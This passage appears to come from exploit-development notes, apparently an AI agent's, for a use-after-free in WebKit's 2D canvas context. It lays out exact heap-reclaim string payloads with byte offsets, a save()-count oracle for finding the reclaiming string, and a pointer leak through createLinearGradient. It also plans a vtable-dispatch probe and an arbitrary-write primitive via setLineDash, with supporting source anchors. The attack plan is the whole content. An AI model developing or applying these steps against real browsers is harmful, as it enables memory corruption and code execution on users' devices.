`+0` and the CanvasPath vptr at `+40` are StringImpl header/string
bytes, but neither path uses them; `setLineDashOffset` is non-virtual.
`m_canvas = C` makes `applyLineDash()` return through the null-context
check.

This is the practical write primitive the earlier chain was reaching
for. It still needs the leak; it does not need a fake State buffer, an
ArrayBuffer at `X`, or a Vector capacity.

---

## 9. Proposed probes (no device run yet)

### 9.0 `v700?mode=cold` — no-reclaim cold-state test (run this first)

Trigger with zero saves; immediately read `innerCtx.canvas === canvas` and
`innerCtx.lineWidth` before any spray. Then `save(); lineWidth = 4242.42`
to force `allocateBuffer(2)` and re-arm `+112`. If this returns, the
address problem is solved for the getter/setter stage without any leak.
Do not allocate 768-byte objects between the free and the read.

### 9.1 `v700` — crash-free reclaim oracle + weak-factory write

Payload: flat **16-bit** string of exactly 374 code units (request
`20 + 748 = 768`, bmalloc class 67 — the class of the 728-byte context).
Build with `String.fromCharCode.apply(null, units)` and include at least
one unit > `0xFF` so JSC takes the 16-bit allocation path
(`StringConstructor.cpp:79`). A 342-code-unit payload (request 704,
class 66) is a **negative control**: it should not reclaim the context.

Zeroed region `+0..+127` (object):
* `+16 = 0` so `m_weakPtrFactory.m_impl` is null;
* `+24 = 0` checked count;
* `+28 = 0` inspector tracer;
* `+32 = 0` `m_canvas`;
* `+112..+127 = 0` `m_stateStack`;
* `+48..+111 = 0` so `m_path` is monostate.

Pattern region `+128..end`: repeat 4 units `[0x0101, 0, 0, 0]` (bytes
`01 01 00 00 00 00 00 00`). At any 8-byte-aligned `m_settings`, this
gives `desynchronized = true` and `colorSpace = srgb`, and it forces a
16-bit unit. The pattern alone would set `m_unrealizedSaveCount` at
`+592` to `0x0101` (unit 286 is a pattern unit), so the probe explicitly
zeroes units 286 and 287 after filling the pattern.

After the UAF, spray N strings. The first check is the **`save()`
oracle**, which needs no `m_buffer` and no `m_settings`: `save()` is a
pure `++m_unrealizedSaveCount` at object `+592`, which is 16-bit char
index `(592-20)/2 = 286`. Snapshot `charCodeAt(282..290)` for every
sprayed string, call `innerCtx.save()`, and compare; the string whose
char 286 incremented is the reclaimer. `restore()` decrements it back.
This both confirms the reclaim and calibrates the true save-count
offset (a later agent measured `m_settings` at object `+720`,
`desynchronized` at data index 700; the save-count index is the more
robust calibration).

Then call in order:
`webkitBackingStorePixelRatio` (baseline),
`getContextAttributes()` (expect `desynchronized: true` if the reclaim
landed on our payload),
`save(); save(); restore(); restore()` (safe),
`beginPath(); closePath()` (monostate, safe),
`createImageData(1,1)` (safe),
`createLinearGradient(0,0,1,1)` (writes the `WeakPtrImpl` pointer at
`+16`),
then scan every sprayed string's `charCodeAt(0/1)` for a change from
zero. The changed string is the reclaimer; its first code units are the
high half of the `WeakPtrImpl` pointer.

Run once with length 374 (expected reclaim) and once with 342 (negative
control). A crash before the gradient
call means the "safe" assumptions are wrong for this build; a crash in
the gradient call means the payload was 8-bit/hashed or `+28` was
non-zero. Beacons before each step localize it.

### 9.2 `v701` — variant layout / `beginPath` dispatch

Use the same payload, but set only the `m_path` bytes:

* `+48 = 0` -> `beginPath()` must not crash (control).
* `+48 = 1` -> `PathSegment` alternative, must not crash.
* `+48 = 2`, `+56..63 = A` for a benign mapped address `A` (e.g. a
  leaked read-only page) -> `beginPath()` should dispatch through
  `A`'s vptr. If it does not crash and the object at `A+0` looks like a
  vtable, libc++ layout is confirmed. If it crashes at a different
  address/offset, the index is at the other end.

### 9.3 `v702` — setLineDash write test after a known `m_buffer`

Only after 8.1 or 8.2 gives a valid `m_buffer`:

* set `m_size = 1` at `+124`, `m_capacity = 1` at `+120`;
* point `m_buffer` at a controlled 448-byte fake State;
* inside the fake State, set `lineDash.m_buffer = target`,
  `lineDash.capacity = N`, `lineDash.size = 0` at `State+168`;
* call `setLineDash([...N doubles...])`;
* verify `target` changed.

If `capacity < N`, verify the arbitrary-free path separately with a
throwaway allocation, not a live object.

---

## 10. Files and source anchors

| Fact | Anchor |
|---|---|
| `Vector` field order | `Source/WTF/wtf/Vector.h:395-397` |
| `last()` = `at(size()-1)`, bounds-checked | `Source/WTF/wtf/Vector.h:775-807` |
| `save()` is `++m_unrealizedSaveCount` | `CanvasRenderingContext2DBase.h:143` |
| `restore()` safe paths | `.scratch/wk-verify/CanvasRenderingContext2DBase.cpp:459` |
| `state()` = `m_stateStack.last()` | `CanvasRenderingContext2DBase.h:311` |
| `setLineDash` path | `.scratch/wk-verify/CanvasRenderingContext2DBase.cpp:670` |
| `getContextAttributes` = `m_settings` | `CanvasRenderingContext2DBase.h:100` |
| `webkitBackingStorePixelRatio` constant | `CanvasRenderingContext2DBase.h:214` |
| no 2D `isContextLost` | `WebGLRenderingContextBase.idl:600` only |
| `CanvasPath` virtual `hasInvertibleTransform` | `CanvasPath.h` + `CanvasRenderingContext2DBase.h:396` |
| `Path::clear` assigns monostate | `Source/WebCore/platform/graphics/Path.cpp:329` |
| `CanvasGradient` WeakPtr | `CanvasGradient.h:54-55` |
| `WeakPtrFactory` layout | `Source/WTF/wtf/WeakPtr.h:190-297` |
| `CanvasBase::drawingContext` null for bitmaprenderer | `Source/WebCore/html/CanvasBase.cpp:79` |
| `String.fromCharCode` 16-bit allocation | `Source/JavaScriptCore/runtime/StringConstructor.cpp:79` |
| `StringImpl` one-block allocation | `Source/WTF/wtf/text/StringImpl.cpp:180-192` |
| bmalloc classes 704/768 | `Source/bmalloc/bmalloc/Sizes.h:46-119` |
